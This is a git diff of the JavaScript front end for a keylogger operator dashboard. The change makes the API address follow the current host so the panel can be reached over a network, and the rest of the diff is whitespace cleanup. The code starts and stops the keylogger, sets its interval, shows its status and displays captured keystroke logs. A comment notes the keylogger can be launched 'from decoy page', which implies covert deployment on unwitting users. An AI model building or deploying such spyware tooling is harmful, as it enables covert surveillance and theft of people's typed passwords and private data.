@@ -1,5 +1,5 @@
-// API Base URL
-const API_URL = 'http://localhost:5000';
+// API Base URL - Automatically detects the host (works for localhost and network IP)
+const API_URL = window.location.origin;
 
 // DOM Elements
 const startBtn = document.getElementById('startBtn');
@@ -29,18 +29,18 @@ async function checkInitialStatus() {
     try {
         const response = await fetch(`${API_URL}/api/status`);
         const data = await response.json();
-        
+
         if (data.is_running) {
             // Keylogger is already running (started from decoy page)
             startBtn.disabled = true;
             stopBtn.disabled = false;
             intervalInput.disabled = true;
-            
+
             // Start status updates
             if (!statusUpdateInterval) {
                 statusUpdateInterval = setInterval(updateStatus, 2000);
             }
-            
+
             console.log('✅ Keylogger already running in background');
         }
     } catch (error) {
@@ -52,8 +52,8 @@ async function checkInitialStatus() {
 function showAlert(message, type = 'success') {
     const alert = document.createElement('div');
     alert.className = `alert alert-${type}`;
-    
-    const icon = type === 'success' 
+
+    const icon = type === 'success'
         ? `<svg class="alert-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M20 6L9 17L4 12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>`
@@ -62,10 +62,10 @@ function showAlert(message, type = 'success') {
              <line x1="12" y1="8" x2="12" y2="12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
              <circle cx="12" cy="16" r="1" fill="currentColor"/>
            </svg>`;
-    
+
     alert.innerHTML = `${icon}<span>${message}</span>`;
     alertContainer.appendChild(alert);
-    
+
     setTimeout(() => {
         alert.style.animation = 'slideInRight 0.3s ease-out reverse';
         setTimeout(() => alert.remove(), 300);
@@ -75,12 +75,12 @@ function showAlert(message, type = 'success') {
 // Start Logging
 startBtn.addEventListener('click', async () => {
     const interval = parseInt(intervalInput.value);
-    
+
     if (interval < 10) {
         showAlert('Interval must be at least 10 seconds', 'error');
         return;
     }
-    
+
     try {
         const response = await fetch(`${API_URL}/api/start`, {
             method: 'POST',
@@ -89,36 +89,36 @@ startBtn.addEventListener('click', async () => {
             },
             body: JSON.stringify({ interval })
         });
-        
+
         const data = await response.json();
-        
+
         if (data.status === 'success') {
             showAlert('Keylogger started successfully');
             startBtn.disabled = true;
             stopBtn.disabled = false;
             intervalInput.disabled = true;
-            
+
             // Start status updates
             statusUpdateInterval = setInterval(updateStatus, 2000);
             updateStatus();
         } else {
             // Handle error - keylogger might already be running
             showAlert(data.message, 'error');
-            
+
             // Check actual status and sync UI
             const statusResponse = await fetch(`${API_URL}/api/status`);
             const statusData = await statusResponse.json();
-            
+
             if (statusData.is_running) {
                 // It's actually running, update UI to reflect this
                 startBtn.disabled = true;
                 stopBtn.disabled = false;
                 intervalInput.disabled = true;
-                
+
                 if (!statusUpdateInterval) {
                     statusUpdateInterval = setInterval(updateStatus, 2000);
                 }
-                
+
                 showAlert('Keylogger is already running', 'error');
             }
         }
@@ -137,21 +137,21 @@ stopBtn.addEventListener('click', async () => {
                 'Content-Type': 'application/json'
             }
         });
-        
+
         const data = await response.json();
-        
+
         if (data.status === 'success') {
             showAlert('Keylogger stopped successfully');
             startBtn.disabled = false;
             stopBtn.disabled = true;
             intervalInput.disabled = false;
-            
+
             // Stop status updates
             if (statusUpdateInterval) {
                 clearInterval(statusUpdateInterval);
                 statusUpdateInterval = null;
             }
-            
+
             updateStatus();
             loadLogs();
         } else {
@@ -174,7 +174,7 @@ async function updateStatus() {
     try {
         const response = await fetch(`${API_URL}/api/status`);
         const data = await response.json();
-        
+
         // Update status text
         if (data.is_running) {
             statusText.textContent = 'Active';
@@ -187,20 +187,20 @@ async function updateStatus() {
             globalStatus.classList.remove('active');
             globalStatus.querySelector('span').textContent = 'STANDBY';
         }
-        
+
         // Update start time
         if (data.start_time) {
             startTime.textContent = formatTime(data.start_time);
         } else {
             startTime.textContent = '--:--:--';
         }
-        
+
         // Update buffer size
         bufferSize.textContent = data.current_buffer.toLocaleString();
-        
+
         // Update session logs count
         sessionLogs.textContent = data.session_logs ? data.session_logs.length : 0;
-        
+
     } catch (error) {
         console.error('Error updating status:', error);
     }
@@ -211,7 +211,7 @@ async function loadLogs() {
     try {
         const response = await fetch(`${API_URL}/api/logs`);
         const logs = await response.json();
-        
+
         if (logs.length === 0) {
             logsContainer.innerHTML = `
                 <div class="empty-state">
@@ -225,7 +225,7 @@ async function loadLogs() {
             `;
             return;
         }
-        
+
         logsContainer.innerHTML = logs.map(log => `
             <div class="log-item" onclick="viewLog('${log.filename}')">
                 <div class="log-header">
@@ -237,7 +237,7 @@ async function loadLogs() {
                 </div>
             </div>
         `).join('');
-        
+
     } catch (error) {
         console.error('Error loading logs:', error);
         showAlert('Failed to load logs', 'error');
@@ -249,7 +249,7 @@ async function viewLog(filename) {
     try {
         const response = await fetch(`${API_URL}/api/logs/${filename}`);
         const data = await response.json();
-        
+
         if (data.status === 'success') {
             // Create modal to show log content
             const modal = document.createElement('div');
@@ -266,7 +266,7 @@ async function viewLog(filename) {
                 z-index: 2000;
                 padding: 2rem;
             `;
-            
+
             modal.innerHTML = `
                 <div style="
                     background: var(--bg-card);
@@ -309,9 +309,9 @@ async function viewLog(filename) {
                     ">${escapeHtml(data.content)}</pre>
                 </div>
             `;
-            
+
             document.body.appendChild(modal);
-            
+
             // Close on background click
             modal.addEventListener('click', (e) => {
                 if (e.target === modal) {
